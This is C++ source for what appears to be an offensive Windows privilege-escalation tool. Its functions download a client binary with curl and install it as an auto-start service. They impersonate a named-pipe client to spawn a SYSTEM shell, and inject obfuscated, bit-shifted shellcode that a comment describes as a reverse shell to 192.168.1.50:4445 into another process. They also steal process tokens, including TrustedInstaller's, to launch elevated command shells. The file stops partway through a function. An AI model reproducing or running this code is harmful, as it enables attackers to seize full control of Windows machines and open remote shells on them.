#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <fstream>
#include <Windows.h>
#include <string>
#include <conio.h>
#include <lmcons.h>
#include <tchar.h>
#include <strsafe.h>
#include <sddl.h>
#include <userenv.h>
#include <Dbghelp.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <psapi.h>
#include "def.h"

#pragma comment(lib, "userenv.lib")

using namespace std;

//errorcodes: https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-
//integrity levels (good resource!): https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/bb625963(v=msdn.10)?redirectedfrom=MSDN
//get process name: https://stackoverflow.com/questions/4570174/how-to-get-the-process-name-in-c
//change integrity level: https://social.msdn.microsoft.com/Forums/en-US/4c78de2f-376c-4eb1-834b-de681f866ada/change-integrity-level-in-current-process-uiaccess?forum=vcgeneral
//more integrity level info: https://stackoverflow.com/questions/12774738/how-to-determine-the-integrity-level-of-a-process
//more integrity level info #2: https://social.msdn.microsoft.com/Forums/windowsdesktop/en-US/09ebc7f1-e3e9-4fd3-a57e-1d43b36e8f82/how-to-tell-what-processes-are-running-with-elevated-privileges?forum=windowssecurity
//SID info: https://learn.microsoft.com/en-US/windows-server/identity/ad-ds/manage/understand-security-identifiers
//lower our token integrity level example: https://kb.digital-detective.net/display/BF/Understanding+and+Working+in+Protected+Mode+Internet+Explorer

void Color(int color)
{
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}
BOOL NamedPipeImpersonate()
{
    setProcessPrivs(SE_IMPERSONATE_NAME);
    Color(2);
    cout << "[+] Downloading named pipe client for you from the repo\n";
    Color(7);
    WinExec("curl -# -L -o \"c:\\users\\public\\warpzoneclient.exe\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/warpzoneclient.exe\"", 0);
    Sleep(3000);
    WinExec("cmd.exe /c sc create plumber binpath= \"C:\\Users\\public\\warpzoneclient.exe\" DisplayName= plumber start= auto", 0);
    
    /* [Deprecated]
    if (HINSTANCE retVal = ShellExecuteW(NULL, L"open", L"cmd.exe", L"/k sc create plumber binpath= \"C:\\Users\\public\\warpzoneclient.exe\" DisplayName= plumber start= auto", NULL, SW_HIDE))
    {
        printf("[+] Successfully created the service!!!\n");
    }
    else
    {
        printf("[!] There was an error creating the service: %d\n", GetLastError());
    }
    */
    LPCWSTR pipeName = L"\\\\.\\pipe\\warpzone8";
    LPVOID pipeBuffer = NULL;
    HANDLE serverPipe;
    DWORD readBytes = 0;
    DWORD readBuffer = 0;
    int err = 0;
    BOOL isPipeConnected;
    wchar_t message[] = L"Greetings plumber!";
    DWORD messageLenght = lstrlen(message) * 2;
    DWORD bytesWritten = 0;
    
    Color(2);
    std::wcout << "[+] Creating named pipe and sleeping for 3 seconds " << pipeName << std::endl;
    Color(7);
    serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
    Sleep(3000);
    WinExec("cmd.exe /c sc start plumber", 0);
    /* [Deprecated]
    if (HINSTANCE retVal2 = ShellExecuteW(NULL, L"open", L"cmd.exe", L"/k sc start plumber", NULL, SW_HIDE))
    {
        printf("[+] Successfully created the service!!!\n");
    }
    else
    {
        printf("[!] There was an error creating the service: %d\n", GetLastError());
    }
    */
    isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
    if (isPipeConnected) {
        Color(2);
        std::wcout << "[+] Incoming connection to " << pipeName << std::endl;
        Color(7);
    }

    std::wcout << "Sending message: " << message << std::endl;
    WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);


    std::wcout << "Impersonating the client..." << std::endl;
    if (ImpersonateNamedPipeClient(serverPipe))
    {
        Color(2);
        printf("[+] Successfully Impersonated the client!!\n");
        Color(7);
    }
    else
    {
        printf("[!] error impersonating the client: %i\n", GetLastError());
        return false;
    }

    wchar_t command[] = L"C:\\Windows\\system32\\cmd.exe";

    BOOL bResult = FALSE;
    HANDLE hSystemToken = INVALID_HANDLE_VALUE;
    HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;

    DWORD dwCreationFlags = 0;
    LPWSTR pwszCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
    {
        printf("OpenThreadToken(). Error: %d\n", GetLastError());
        return false;
    }

    if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
    {
        printf("DuplicateTokenEx() failed. Error: %d\n", GetLastError());
        return false;
    }
   

    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB;
    //https://stackoverflow.com/questions/58040954/how-to-launch-an-interactive-process-in-windows-on-java/58093917#58093917
    //https://learn.microsoft.com/en-us/archive/blogs/alejacma/createprocessasuser-fails-with-error-5-access-denied-when-using-jobs

    //BOOL bRet;

    if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
    {
        printf("error setting current directory: %d\n", GetLastError());
        return false;
    }
    if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
    {
        wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
        return false;
    }
    if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
    {
        wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
        return false;
    }


    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
   
    if (CreateProcessAsUser(hSystemTokenDup, NULL, command, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
    {
        Color(2);
        printf("[+] successfully created a SYSTEM shell!!!\n");
        Color(7);
        fflush(stdout);
        WaitForSingleObject(pi.hProcess, INFINITE);
        if (hSystemToken)
            CloseHandle(hSystemToken);
        if (hSystemTokenDup)
            CloseHandle(hSystemTokenDup);
        if (pwszCurrentDirectory)
            free(pwszCurrentDirectory);
        if (lpEnvironment)
            DestroyEnvironmentBlock(lpEnvironment);
        if (pi.hProcess)
            CloseHandle(pi.hProcess);
        if (pi.hThread)
            CloseHandle(pi.hThread);
        return true;
    }
    else
    {
        printf("[!] There was an error creating the SYSTEM shell using CreateProcessAsUser - Error Code: %d\n", GetLastError());
        if (hSystemToken)
            CloseHandle(hSystemToken);
        if (hSystemTokenDup)
            CloseHandle(hSystemTokenDup);
        if (pwszCurrentDirectory)
            free(pwszCurrentDirectory);
        if (lpEnvironment)
            DestroyEnvironmentBlock(lpEnvironment);
        if (pi.hProcess)
            CloseHandle(pi.hProcess);
        if (pi.hThread)
            CloseHandle(pi.hThread);
        return false;
    }
    /*
    bRet = CreateProcessWithTokenW(hSystemTokenDup, NULL, NULL, command, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi);

    if (bRet == 0)
    {
        printf("[!] CreateProcessWithToken didn't cooperate...permissions maybe???\n");
        printf("Return value: %d\n", GetLastError());
        fflush(stdout);
        return false;
    }
    else
    {
        printf("[+] CreateProcessWithToken worked!!!\n");
        printf("Return value: %d\n", bRet);
        fflush(stdout);
        WaitForSingleObject(pi.hProcess, INFINITE);
        return true;
    }

    */

    //WinExec("cmd.exe /c sc delete plumber", 0);
    /* [Deprecated]
    if (HINSTANCE retVal3 = ShellExecuteW(NULL, L"open", L"cmd.exe", L"/k sc delete plumber", NULL, SW_HIDE))
    {
        printf("[+] Successfully deleted the service!!!\n");
    }
    else
    {
        printf("[!] There was an error deleting the service: %d\n", GetLastError());
    }
    */
}


bool Inj3ct0r(DWORD pid)
{
    //bitwise shift right encoding method
    //ip: 192.168.1.50
    //port: 4445
    unsigned char b33fy[] =
        "\x7e\x24\x41\x72\x78\x74\x60\x0\x0\x0\x20\x28\x20\x28"
        "\x29\x28\x2b\x24\x18\x69\x32\x24\x45\x29\x30\x24\x45\x29"
        "\xc\x24\x45\x29\x10\x24\x45\x39\x28\x24\x7\x5b\x25\x25"
        "\x26\x18\x64\x24\x18\x60\x56\x1e\x30\x3e\x1\x16\x10\x20"
        "\x60\x64\x6\x20\x0\x60\x71\x76\x29\x20\x28\x24\x45\x29"
        "\x10\x45\x21\x1e\x24\x0\x68\x45\x40\x44\x0\x0\x0\x24"
        "\x42\x60\x3a\x33\x24\x0\x68\x28\x45\x24\xc\x22\x45\x20"
        "\x10\x24\x0\x68\x71\x2b\x24\x7f\x64\x20\x45\x1a\x44\x24"
        "\x0\x6b\x26\x18\x64\x24\x18\x60\x56\x20\x60\x64\x6\x20"
        "\x0\x60\x1c\x70\x3a\x78\x26\x1\x26\x12\x4\x22\x1c\x68"
        "\x3a\x6c\x2c\x22\x45\x20\x12\x24\x0\x68\x33\x20\x45\x6"
        "\x24\x22\x45\x20\xe\x24\x0\x68\x20\x45\x2\x44\x24\x0"
        "\x68\x20\x2c\x20\x2c\x2f\x2c\x2d\x20\x2c\x20\x2c\x20\x2d"
        "\x24\x41\x76\x10\x20\x29\x7f\x70\x2c\x20\x2c\x2d\x24\x45"
        "\x9\x74\x2b\x7f\x7f\x7f\x2e\x24\x5f\x3b\x39\x19\x2f\x19"
        "\x19\x0\x0\x20\x2b\x24\x44\x73\x24\x40\x76\x50\x0\x0"
        "\x0\x24\x44\x72\x24\x5e\x1\x0\x8\x2e\x60\x54\x0\x19"
        "\x20\x2a\x24\x44\x72\x26\x44\x78\x20\x5d\x26\x3b\x13\x3"
        "\x7f\x6a\x26\x44\x75\x34\x0\x0\x0\x0\x2c\x20\x5d\x14"
        "\x40\x35\x0\x7f\x6a\x28\x28\x26\x18\x64\x26\x18\x60\x24"
        "\x7f\x60\x24\x44\x61\x24\x7f\x60\x24\x44\x60\x20\x5d\x75"
        "\x7\x6f\x70\x7f\x6a\x24\x44\x63\x35\x8\x20\x2c\x26\x44"
        "\x71\x24\x44\x7c\x20\x5d\x4c\x52\x3a\x30\x7f\x6a\x24\x40"
        "\x62\x20\x1\x0\x0\x24\x5c\x31\x36\x32\x0\x0\x0\x0"
        "\x0\x20\x28\x20\x28\x24\x44\x71\x2b\x2b\x2b\x26\x18\x60"
        "\x35\x6\x2c\x20\x28\x71\x7e\x33\x63\x22\x12\x2a\x0\x0"
        "\x24\x46\x22\x12\xc\x63\x0\x34\x24\x44\x73\x2b\x28\x20"
        "\x28\x20\x28\x20\x28\x24\x7f\x60\x20\x28\x24\x7f\x64\x26"
        "\x44\x60\x26\x44\x60\x20\x5d\x3c\x66\x1f\x43\x7f\x6a\x24"
        "\x18\x69\x24\x7f\x65\x45\x7\x20\x5d\x4\x43\xe\x30\x7f"
        "\x6a\x5d\x78\x5a\x51\x2b\x20\x5d\x53\x4a\x5e\x4e\x7f\x6a"
        "\x24\x41\x62\x14\x1e\x3\x3e\x5\x40\x7d\x70\x3a\x2\x5d"
        "\x23\x9\x39\x37\x35\x0\x2c\x20\x44\x6d\x7f\x6a";

    //keeps track of odd and even values since shifting right can make a bit negative or positive
    //same with shifting left so we have to keep track of that sort of thing
    unsigned int onesnzeros[] =

    { 0,0,1,0,0,0,0,0,0,0,1,1,1,0,
    0,1,0,0,1,0,1,0,1,0,0,0,1,0,
    0,0,1,0,0,0,1,0,0,0,1,1,0,0,
    1,1,1,0,1,0,0,0,1,0,0,0,0,1,
    1,1,1,1,1,1,0,1,0,1,1,0,1,0,
    0,1,0,0,0,1,0,1,0,0,0,0,0,0,
    1,0,0,1,0,1,0,0,1,0,0,0,1,0,
    0,1,1,0,1,0,0,1,1,1,1,0,0,0,
    1,0,1,1,1,0,1,0,0,1,1,1,1,1,
    1,1,0,0,1,1,0,1,0,0,0,1,1,1,
    1,0,0,0,1,0,0,1,1,0,0,1,1,0,
    0,0,1,0,0,1,1,0,1,1,0,0,0,1,
    0,1,0,1,0,0,1,0,1,0,1,1,1,0,
    0,1,0,0,1,0,1,0,0,1,1,0,0,1,
    0,1,1,1,1,1,1,1,0,1,1,0,1,1,
    0,0,0,1,0,1,1,0,0,1,0,0,1,0,
    0,1,1,1,1,0,0,0,1,1,0,0,1,0,
    1,0,1,1,0,0,1,1,1,0,0,1,0,1,
    1,1,0,1,0,0,1,1,0,0,1,1,0,1,
    0,1,0,1,1,0,0,1,1,1,1,1,0,0,
    1,0,0,1,0,0,1,0,0,1,1,1,0,0,
    1,1,0,1,1,0,1,1,0,0,1,0,0,1,
    0,0,1,1,1,0,1,1,0,1,1,1,0,1,
    0,0,0,0,0,1,0,1,1,0,0,0,0,0,
    0,1,0,1,0,0,1,0,1,1,1,1,1,0,
    0,1,1,1,0,0,0,0,1,0,0,0,1,1,
    0,1,0,0,0,0,0,0,0,1,0,0,0,1,
    0,1,0,1,0,1,1,0,1,0,1,1,0,1,
    1,1,0,1,1,1,0,1,0,1,0,1,1,0,
    1,0,0,1,0,1,0,1,0,0,1,1,0,1,
    1,1,0,1,0,0,1,0,0,1,1,1,1,1,
    0,1,0,0,0,0,0,0,0,1,0,1,1,1,
    1,1,0,1,0,0,1,1,1,0,1,1 };

    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    LPVOID lpBuffer = NULL;
    int iSize;
    DWORD dwProcessId = 0;

     //printf("size of buf: %d", sizeof(buf));

    /* xor routine
    char mycode[sizeof(buf)-1];
    for (int i = 0; i < sizeof(mycode); i++)
    {
        mycode[i] = buf[i] ^ 99;
        //printf("\%x", buf[i] ^ 99);
    }
    */

 
    setProcessPrivs(SE_DEBUG_NAME);
    SIZE_T lpnumber = 0;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess)
        printf("[!] Failed to open the target process: %d\n", GetLastError());
    else
        printf("[+] Opened Process!: %d\n", pid);

    BOOL bIsWow64 = FALSE;
    if (!IsWow64Process(hProcess, &bIsWow64)) //execute the API
    {
        printf("[!] There was an issue executing the api against this PID: %d\n", GetLastError());
    }

    //printf("%s", bIsWow64 ? "true" : "false");

    if (!bIsWow64)
    {
        printf("[+] PID %d is 64-bit!\n", pid);
    }
    else
    {
        printf("[!] PID %d is 32-bit and won't work with this program...\n", pid);
        printf("[!] Can't inject into a 32-bit process...\n");
    }

    const int lenny = sizeof(b33fy) / sizeof(b33fy[0]);
    char shifted[lenny];
    //char shiftright[lenny];
    for (int b = 0; b < lenny - 1; b++)
    {
        shifted[b] = b33fy[b] << 1;
        if (onesnzeros[b] == 1)
        {
            //printf("1\n");
            shifted[b] = shifted[b] + 1;
        }
        //printf("back to original (shleft): x%02hhx\n", shifted[b]);
        //printf("==================================\n");

    }

    iSize = sizeof(shifted);
    //printf("iSize = % d\n", iSize);
    LPVOID vptr = (int*)VirtualAllocEx(hProcess, NULL, iSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    BOOL b = WriteProcessMemory(hProcess, vptr, shifted, iSize, &lpnumber);
    if (!b)
        printf("[!] Failed to Write to memory: %d\n", GetLastError());
    else
        printf("[+] Wrote Memory!\n");
    HANDLE h = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)vptr, NULL, 0, 0);

    if (h == NULL)
    {
        printf("[!] Failed to execute $h311c0d3: %d\n", GetLastError());
    }
    else
    {
        printf("[+] Successful execution of $h311c0d3!!!\n");
    }

    return 0;

    CloseHandle(hProcess);

        return 0;
}

int CheckProcessIntegrity(DWORD pid)
{
    //enable SE_DEBUG!!!
    //setProcessPrivs(SE_DEBUG_NAME); shouldn't need this, re-enable if you need to
    //Enable SE_DEBUG routine complete

    HANDLE hProc;
    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc)
    {
        printf("[!] There was a permissions error opening the process w/ all access...: %d\n", GetLastError());
    }
    std::string procname;
    DWORD buffSize = 1024;
    CHAR buffer[1024];
    if (QueryFullProcessImageNameA(hProc, 0, buffer, &buffSize))
    {
        procname = buffer;
        std::cout << "processname: " << procname;
        std::cout << "\n";
    }

    HANDLE hTok;
    if (!OpenProcessToken(hProc, TOKEN_QUERY, &hTok))
    {
        Color(14);
        printf("[!] There was an a permissions error applying all access to the token: %d\n", GetLastError());
        Color(7);
    }
    DWORD lengthneeded;
    DWORD dwIntegrityLevel;
    PTOKEN_MANDATORY_LABEL pTIL = NULL;
    GetTokenInformation(hTok, TokenIntegrityLevel, NULL, 0, &lengthneeded);
    pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, lengthneeded);
    GetTokenInformation(hTok, TokenIntegrityLevel, pTIL, lengthneeded, &lengthneeded);
    dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
    printf("Integrity Level: %x\n", dwIntegrityLevel);
    if (dwIntegrityLevel == 0)
    {
        printf("0x0000 | Untrusted level | SECURITY_MANDATORY_UNTRUSTED_RID\n");
    }
    if (dwIntegrityLevel == 0x1000)
    {
        printf("0x1000 | Low integrity level | SECURITY_MANDATORY_LOW_RID\n");
    }
    if (dwIntegrityLevel == 0x2000)
    {
        printf("0x2000 | Medium integrity level | SECURITY_MANDATORY_MEDIUM_RID\n");
    }
    if (dwIntegrityLevel == 0x2010)
    {
        printf("0x2010 | Medium+ integrity level | SECURITY_MANDATORY_MEDIUM_PLUS_RID\n");
    }
    if (dwIntegrityLevel == 0x3000)
    {
        printf("0x3000 | High integrity level | SECURITY_MANDATORY_HIGH_RID\n");
    }
    if (dwIntegrityLevel == 0x4000)
    {
        printf("0x4000 | System integrity level | SECURITY_MANDATORY_SYSTEM_RID\n");
    }
    CloseHandle(hProc);
    CloseHandle(hTok);
    return dwIntegrityLevel;
}

int DupThreadToken(DWORD pid, bool ti)
{

    if (ti)
    {

        DWORD tipid = {};
        //pid = atoi(argv[1]);
        HANDLE pHandle = NULL;
        STARTUPINFOEXA si;
        PROCESS_INFORMATION pi;
        SIZE_T size = {};
        BOOL ret;

        //start Trusted Installer
        WinExec("cmd.exe /c sc start TrustedInstaller", 0);
        printf("sleeping for 5 seconds to allow TrustedInstaller service time to get started...\n");
        Sleep(5000);
        HANDLE hProcessSnap;
        PROCESSENTRY32 pe32;

        // Take a snapshot of all processes in the system.
        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE)
        {
            printf("CreateToolhelp32Snapshot error: %d\n", GetLastError());
            return(FALSE);
        }

        // Set the size of the structure before using it.
        pe32.dwSize = sizeof(PROCESSENTRY32);

        // Retrieve information about the first process,
        // and exit if unsuccessful
        if (!Process32First(hProcessSnap, &pe32))
        {
            printf("Process32First error: %d\n", GetLastError()); // show cause of failure
            CloseHandle(hProcessSnap);          // clean the snapshot object
            return(FALSE);
        }

        do
        {

            if (wcscmp(L"TrustedInstaller.exe", pe32.szExeFile) == 0)
            {
                _tprintf(TEXT("\nProcess ID for TrustedInstaller: %d\n"), pe32.th32ProcessID);
                tipid = pe32.th32ProcessID;
                break;
            }

        } while (Process32Next(hProcessSnap, &pe32));

        CloseHandle(hProcessSnap);

        setProcessPrivs(SE_DEBUG_NAME);
        // Open the TRUSTEDINSTALLER process so we can inherit the handle from it!
        if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, tipid)) == 0) {
            printf("Error opening PID %d\n", tipid);
            return 2;
        }

        // Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
        ZeroMemory(&si, sizeof(STARTUPINFOEXA));

        InitializeProcThreadAttributeList(NULL, 1, 0, &size);
        si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
            GetProcessHeap(),
            0,
            size
        );
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
        UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);

        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        si.StartupInfo.wShowWindow = SW_HIDE;

        // Finally, create the process
        ret = CreateProcessA(
            "C:\\WINDOWS\\System32\\cleanmgr.exe",
            NULL,
            NULL,
            NULL,
            true,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
            NULL,
            NULL,
            reinterpret_cast<LPSTARTUPINFOA>(&si),
            &pi
        );

        if (ret == false) {
            printf("Error creating new process (%d)\n", GetLastError());
            return 3;
        }


        HANDLE hProcessSnap2;
        PROCESSENTRY32 pe322;

        // Take a snapshot of all processes in the system.
        hProcessSnap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap2 == INVALID_HANDLE_VALUE)
        {
            printf("CreateToolhelp32Snapshot error: %d\n", GetLastError());
            return(FALSE);
        }

        // Set the size of the structure before using it.
        pe322.dwSize = sizeof(PROCESSENTRY32);

        // Retrieve information about the first process,
        // and exit if unsuccessful
        if (!Process32First(hProcessSnap2, &pe322))
        {
            printf("Process32First error: %d\n", GetLastError()); // show cause of failure
            CloseHandle(hProcessSnap2);          // clean the snapshot object
            return(FALSE);
        }

        do
        {

            if (wcscmp(L"cleanmgr.exe", pe322.szExeFile) == 0)
            {
                _tprintf(TEXT("\nProcess ID for cleanmgr: %d\n"), pe322.th32ProcessID);
                pid = pe322.th32ProcessID;
                break;
            }

        } while (Process32Next(hProcessSnap2, &pe322));

        CloseHandle(hProcessSnap2);

    }

    setProcessPrivs(SE_DEBUG_NAME);

    BOOL bRet;

    HANDLE hNewToken;
    //HANDLE proc2;
    HANDLE tok2;
    //DWORD pid = pid;
    DWORD dwCreationFlags = 0;
    LPWSTR pwszCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;

    WCHAR wszProcessName[MAX_PATH] = L"C:\\windows\\system32\\cmd.exe";
    //WCHAR wszProcessName[MAX_PATH] = L"C:\\users\\public\\node.exe c:\\users\\public\\testcopy2.js";

    TOKEN_MANDATORY_LABEL TIL = { 0 };
    PROCESS_INFORMATION ProcInfo = { 0 };
    STARTUPINFO StartupInfo = { 0 };
    ULONG ExitCode = 0;
    HANDLE remoteproc;
    HANDLE hSystemToken;
    HANDLE hSystemTokenDup;
    
    // ImpersonateSelf(SecurityImpersonation);
    remoteproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
    if (remoteproc)
    {
        Color(2);
        wprintf(L"[+] Opened remote process!\n");
        Color(7);
    }
    else
    {
        Color(14);
        wprintf(L"[!] OpenProcess(). Error: %d\n", GetLastError());
        Color(7);
    }
  
    if (!OpenProcessToken(remoteproc, TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &tok2))
    {
        Color(14);
        wprintf(L"[!] OpenProcessToken(). Error: %d\n", GetLastError());
        Color(7);
    }
   

    if (!DuplicateToken(tok2, SecurityImpersonation, &hNewToken))
    {
        Color(14);
        wprintf(L"[!] DuplicateTokenEx() failed. Error: %d\n", GetLastError());
        Color(7);
    }
  
    if (SetThreadToken(NULL, hNewToken))
    {
        Color(2);
        printf("[+] Successfully set the thread token!\n");
        Color(7);
    }
    

    setThreadPrivs(SE_INCREASE_QUOTA_NAME);     //need this for CreateProcessAsUser!
    setThreadPrivs(SE_ASSIGNPRIMARYTOKEN_NAME); //need this for CreateProcessAsUser!

    printf("[+] Thread privs set!\n");

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
    {
        Color(14);
        wprintf(L"[!] OpenThreadToken(). Error: %d\n", GetLastError());
        Color(7);
    }
    
    if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
    {
        Color(14);
        wprintf(L"[!] DuplicateTokenEx() failed. Error: %d\n", GetLastError());
        Color(7);
    }
  
    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB;

    if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
    {
        wprintf(L"[!] setting pwszCurrentDirectory failed. Error: %d\n", GetLastError());
    }
    if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
    {
        wprintf(L"[!] GetSystemDirectory() failed. Error: %d\n", GetLastError());
    }

    if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
    {
        wprintf(L"[!] CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
    }
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    StartupInfo.cb = sizeof(STARTUPINFO);
    StartupInfo.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
    // Create the new process w/ CreateProcessAsUser to keep within same console
    //cin.get();
    bRet = CreateProcessAsUser(hSystemTokenDup, NULL, wszProcessName, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);

    if (bRet == 0)
    {
        Color(14);
        printf("[!] CreateProcessAsUser didn't cooperate...\n");
        Color(7);
        printf("Return value: %d\n", GetLastError());
    }
    else
    {
        Color(2);
        printf("[+] CreateProcessAsUser worked!!!\n");
        Color(7);
        printf("Return value: %d\n", bRet);
        fflush(stdout);
        WaitForSingleObject(ProcInfo.hProcess, INFINITE);

    }
    //fflush(stdout);
    //WaitForSingleObject(ProcInfo.hProcess, INFINITE);

    //CloseHandle(currentToken);

    /*
    bRet = CreateProcessWithTokenW(hSystemTokenDup, NULL, NULL, wszProcessName, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);

    if (bRet == 0)
    {
        printf("[!] CreateProcessWithToken didn't cooperate...permissions maybe???\n");
        printf("Return value: %d\n", GetLastError());
    }
    else
    {
        printf("[+] CreateProcessWithToken worked!!!\n");
        printf("Return value: %d\n", bRet);
        fflush(stdout);
        WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    }
    */
    //fflush(stdout);
    //WaitForSingleObject(ProcInfo.hProcess, INFINITE);

    HANDLE finishhim = OpenProcess(PROCESS_TERMINATE, false, pid);
    TerminateProcess(finishhim, 0);
    CloseHandle(finishhim);

    CloseHandle(hSystemToken);
    CloseHandle(tok2);
    CloseHandle(remoteproc);
    CloseHandle(hNewToken);
    CloseHandle(hSystemTokenDup);
    return 0;

}

int DupProcessToken(DWORD pid)
{
    //enable ALL necessary privs!!!
    setProcessPrivs(SE_DEBUG_NAME);
    //priv enable routine complete
    BOOL bRet;

    HANDLE hNewToken;
    HANDLE proc2;
    HANDLE tok2;
    //DWORD pid = pid;
    DWORD dwCreationFlags = 0;
    LPWSTR pwszCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;

    WCHAR wszProcessName[MAX_PATH] = L"C:\\windows\\system32\\cmd.exe";
    //WCHAR wszProcessName[MAX_PATH] = L"C:\\users\\public\\node.exe c:\\users\\public\\testcopy2.js";

    TOKEN_MANDATORY_LABEL TIL = { 0 };
    PROCESS_INFORMATION ProcInfo = { 0 };
    STARTUPINFO StartupInfo = { 0 };
    ULONG ExitCode = 0;

    proc2 = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!proc2)
    {
        Color(14);
        printf("[!] There was a permissions error opening process: %d w/ requested access...: %d\n", pid, GetLastError());
        Color(7);
        exit(0);
    }

    if (!OpenProcessToken(proc2, MAXIMUM_ALLOWED, &tok2))
    {
        Color(14);
        printf("[!] There was a permissions error applying the requested access to the token: %d\n", GetLastError());
        Color(7);
        exit(0);
    }
    // TCHAR name[UNLEN + 1];
    // DWORD size = UNLEN + 1;
    // GetUserName((TCHAR*)name, &size);

     //bool writestatus = MyCreateFileFunc();
     //printf("Boolean return value: %s\n", writestatus ? "true" : "false");

     /*
     * !!!Experimental!!!
     cout << "Attempting to impersonate user in context of PID: " << pid << "\n";

     BOOL impersonator=ImpersonateLoggedOnUser(tok2);
     if (impersonator)
     {
         //WinExec("py",1);
         TCHAR name[UNLEN + 1];
         DWORD size = UNLEN + 1;
         GetUserName((TCHAR*)name, &size);
         wcout << L"[+] Impersonation Success!  You are now: " << name << "!\n";

         bool writestatus = MyCreateFileFunc(); //Attempt to write a file to another user's directory we wouldn't normally have access to
         printf("Boolean return value: %s\n", writestatus ? "true" : "false");


        RevertToSelf();
     }
     else
     {
         printf("There was an issue impersonating the user...error code: %d\n", GetLastError());
     }
     */

    if (!DuplicateTokenEx(tok2, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken))
    {
        Color(14);
        wprintf(L"[!] DuplicateTokenEx failed. Error: %d\n", GetLastError());
        Color(7);
    }
    else
    {
        Color(2);
        printf("[+] DuplicateTokenEx success!!!\n");
        Color(7);
    }
   
    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB;


    if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
    {
        wprintf(L"[!] setting pwszCurrentDirectory failed. Error: %d\n", GetLastError());
    }
    if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
    {
        wprintf(L"[!] GetSystemDirectory() failed. Error: %d\n", GetLastError());
    }

    if (!CreateEnvironmentBlock(&lpEnvironment, hNewToken, FALSE))
    {
        wprintf(L"[!] CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
    }
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    StartupInfo.cb = sizeof(STARTUPINFO);
